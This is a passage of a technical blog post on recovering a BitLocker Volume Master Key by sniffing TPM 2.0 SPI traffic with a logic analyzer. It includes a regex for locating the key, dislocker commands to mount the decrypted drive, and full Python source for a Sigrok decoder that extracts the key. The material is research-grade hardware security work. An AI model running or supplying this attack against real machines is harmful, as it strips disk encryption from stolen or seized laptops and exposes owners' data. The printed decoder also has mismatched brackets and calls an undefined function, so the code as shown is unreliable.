<p>Creating a Sigrok plugin is a straightforward process, thanks to the detailed official guide available on the Sigrok website at <a href="https://sigrok.org/wiki/Protocol_decoder_HOWTO">https://sigrok.org/wiki/Protocol_decoder_HOWTO</a>. Given that we are working with the Serial Peripheral Interface (SPI) protocol, it is appropriate to use Sigrok’s “Stacked Decoder” functionality, which allows chaining multiple decoders and using the output of one decoder as input for another. This approach simplifies the process, eliminating the need to manually locate and extract individual bits of data from the raw SPI data and allows focusing on the actual formed bytes produced by the Sigrok SPI decoder.</p>

<p>To start, you need to create a “tpmdecoder” folder in the plugins directory (on Linux, it’s located at ~/.local/share/libsigrokdecode/decoders/), with the following files attached to this post:</p>

<ul>
  <li><strong>init</strong>.py</li>
  <li>pd.py</li>
</ul>

<p>These are the necessary files for the decoder that was developed. Basically, a decoder for the TPM registers was created, as described in <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>After creating and saving the PulseView project, you need to close and reopen it. The plugin should be loaded automatically. In the SPI plugin settings, in the “Stacked Decoder” option, the “TPM2.0” option should be available.
<img src="/assets/posts/patreon/Pasted image 20230124035119.png" alt="" />
And after selecting, it will start to try to find TPM2.0 messages over the SPI data. <img src="/assets/posts/patreon/Pasted image 20230124035129.png" alt="" /></p>

<h3 id="bitlocker-key">Bitlocker Key</h3>

<p>For this section, it is highly recommended to check out the <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc">libbde</a> documentation on GitHub. The documentation contains almost all (if not all) information related to Bitlocker, including legacy versions.</p>

<p>The key we want to recover is actually the Bitlocker Volume Master Key, which has a specific format. We can use a regular expression to recover this key instead of trying to understand each request, which would take more time to create a decoder.</p>

<p>The data that is actually encrypted by the TPM is an FVE metadata entry, as described in section <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry">5.3 of libbde</a>. This presents some headers that can be matched with a regular expression.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
</code></pre></div></div>

<p>After all the header, the Volume Master Key (VMK) is concatenated. To find the key, just look for 64 characters (32 bytes, which corresponds to a 256-bit key).</p>

<p>To facilitate use, the attached decoder prints the found keys in the decoding terminal (so it is not necessary to use the PulseView interface, if not desired) and also shows in a separate line in PulseView.
<img src="/assets/posts/patreon/Pasted image 20230124035206.png" alt="" /></p>

<h3 id="accessing-data-using-the-downloaded-vmk">Accessing Data Using the Downloaded VMK</h3>

<p>To access data encrypted by Bitlocker, we will use the dislocker project (<a href="https://github.com/Aorimn/dislocker">https://github.com/Aorimn/dislocker</a>) to mount the partition as plain text. Before that, it is necessary to save the entire key as a file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"66D96600C7..."</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> vmk.key
</code></pre></div></div>

<p>Then, we can use dislocker to create a device node with the plain text device, using partition n on sdx:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sdxn <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>For example, if the encrypted partition is on /dev/sda3, you can use:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sda3 <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>A dislocker-file will be created inside the ./mydisk folder, representing the device and can be mounted as a normal partition.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> remove_hiberfile ./mydisk/dislocker-file /media/disk
</code></pre></div></div>

<p>Now, you can access the decrypted data in the /media/disk folder.</p>

<p>All Consolidated References
Here are all the consolidated references for you to check:</p>

<ul>
  <li>
    <p>TPM 2.0 Specification - <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
  </li>
  <li>
    <p>F-Secure - Sniff, there leaks - <a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
  </li>
  <li>
    <p>DolosGroup - From Stolen Laptop to Inside the company network - <a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
  </li>
</ul>

<h1 id="files">Files</h1>

<h3 id="__init__py"><code class="language-plaintext highlighter-rouge">__init__.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">from</span> <span class="nn">.pd</span> <span class="kn">import</span> <span class="n">Decoder</span>
</code></pre></div></div>

<h3 id="pdpy"><code class="language-plaintext highlighter-rouge">pd.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">import</span> <span class="nn">sigrokdecode</span> <span class="k">as</span> <span class="n">srd</span>
<span class="kn">import</span> <span class="nn">binascii</span><span class="p">,</span> <span class="n">re</span>
<span class="kn">from</span> <span class="nn">enum</span> <span class="kn">import</span> <span class="n">Enum</span>

<span class="n">OPERATION_MASK</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">SIZE_MASK</span> <span class="o">=</span> <span class="mh">0x3f</span>
<span class="n">WAIT_MASK</span> <span class="o">=</span> <span class="mh">0x01</span>

<span class="c1"># Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
# Page 63 (pdf 71) - Table 17
</span>
<span class="n">tpmRegisters</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0xD40000</span><span class="p">:</span> <span class="s">"TPM_ACCESS_0"</span><span class="p">,</span>
    <span class="mh">0xD4000C</span><span class="p">:</span> <span class="s">"TPM_INT_VECTOR_0"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40008</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INT_ENABLE_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40010</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INT_STATUS_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40014</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INTF_CAPABILITY_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40018</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_STS_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40024</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_DATA_FIFO_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40030</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INTERFACE_ID_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40080</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_XDATA_FIFO_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40F00</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_DID_VID_0"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"{:08X} = {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

<span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
    <span class="n">READING_OP</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">READING_ARG</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">WAITING</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="n">TRANSFER</span> <span class="o">=</span> <span class="mi">4</span>

<span class="k">class</span> <span class="nc">Decoder</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">Decoder</span><span class="p">):</span>
    <span class="n">api_version</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="s">'tpm20'</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">'TPM2.0'</span>
    <span class="n">longname</span> <span class="o">=</span> <span class="s">'TPM 2.0'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="s">'A TPM 2.0 Protocol Decoder'</span>
    <span class="n">license</span> <span class="o">=</span> <span class="s">'gplv2+'</span>
    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span><span class="s">'spi'</span><span class="p">]</span>
    <span class="n">outputs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="s">'SPI'</span><span class="p">,</span> <span class="s">'TPM'</span><span class="p">]</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
    <span class="n">annotations</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">'Text'</span><span class="p">),</span>                   <span class="c1"># 0
</span>        <span class="p">(</span><span class="s">'warning'</span><span class="p">,</span> <span class="s">'Warning'</span><span class="p">),</span>             <span class="c1"># 1
</span>        <span class="p">(</span><span class="s">'data-write'</span><span class="p">,</span> <span class="s">'Data write'</span><span class="p">),</span>       <span class="c1"># 2
</span>        <span class="p">(</span><span class="s">'data-read'</span><span class="p">,</span> <span class="s">'Data read'</span><span class="p">),</span>         <span class="c1"># 3
</span>        <span class="p">(</span><span class="s">'fifo-write'</span><span class="p">,</span> <span class="s">'FIFO write'</span><span class="p">),</span>       <span class="c1"># 4
</span>        <span class="p">(</span><span class="s">'fifo-read'</span><span class="p">,</span> <span class="s">'FIFO read'</span><span class="p">),</span>         <span class="c1"># 5
</span>        <span class="p">(</span><span class="s">'bitlocker-key'</span><span class="p">,</span> <span class="s">'Bitlocker Key'</span><span class="p">),</span> <span class="c1"># 6
</span>    <span class="p">)</span>
    <span class="n">annotation_rows</span> <span class="o">=</span> <span class="p">(</span>
         <span class="p">(</span><span class="s">'row-read'</span><span class="p">,</span> <span class="s">'Read'</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="s">'row-write'</span><span class="p">,</span> <span class="s">'Write'</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="s">'row-fifo-read'</span><span class="p">,</span> <span class="s">'FIFO Read'</span><span class="p">,</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="s">'row-fifo-write'</span><span class="p">,</span> <span class="s">'FIFO Write'</span><span class="p">,</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="s">'row-bitlocker-key'</span><span class="p">,</span> <span class="s">'Bitlocker Key'</span><span class="p">,</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">)),</span>
    <span class="p">)</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="s">'packet-read'</span><span class="p">,</span> <span class="s">'Packet read'</span><span class="p">),</span>
        <span class="p">(</span><span class="s">'packet-write'</span><span class="p">,</span> <span class="s">'Packet write'</span><span class="p">),</span>
    <span class="p">)</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">reset</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_ANN</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">out_python</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_PYTHON</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">out_binary</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_BINARY</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"DATA"</span><span class="p">:</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span> <span class="o">=</span> <span class="n">data</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">putdata</span><span class="p">(</span><span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">report_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="s">"{}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">tpmRegisters</span><span class="p">[</span><span class="n">addr</span><span class="p">],</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="s">"RESERVED({:06X}): {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">3</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">]</span> <span class="p">])</span>

    <span class="k">def</span> <span class="nf">report_fifo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"{:02X}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">5</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="p">[</span><span class="n">key</span><span class="p">))</span>

    <span class="n">opIsRead</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">numBytes</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">transactionStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">transactionEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">putdata</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">OPERATION_MASK</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span>    <span class="c1"># 1 = read, 0 = write
</span>            <span class="bp">self</span><span class="p">.</span><span class="n">numBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">SIZE_MASK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c1"># Minimum transfer = 1 byte
</span>            <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span> <span class="o">=</span> <span class="n">ss</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">mosi</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># Wait state
</span>                    <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Wait finished
</span>                <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span><span class="p">:</span>
            <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Read from device
</span>                <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">miso</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>   <span class="c1"># Read from controller
</span>                <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">mosi</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="p">.</span><span class="n">numBytes</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span> <span class="o">=</span> <span class="n">es</span>
                <span class="c1">#print("Transaction: ", self.bytesRead)
</span>                <span class="bp">self</span><span class="p">.</span><span class="n">report_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span> <span class="ow">and</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="bp">self</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span> <span class="o">==</span> <span class="s">"TPM_DATA_FIFO_0"</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">putfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">endfifo</span><span class="p">()</span>

                <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># 0 = Write, 1 = Read
</span>    <span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">fifoStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">fifoEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">endfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="c1"># No FIFO
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">report_fifo</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"{:02X}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Bitlocker Key: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
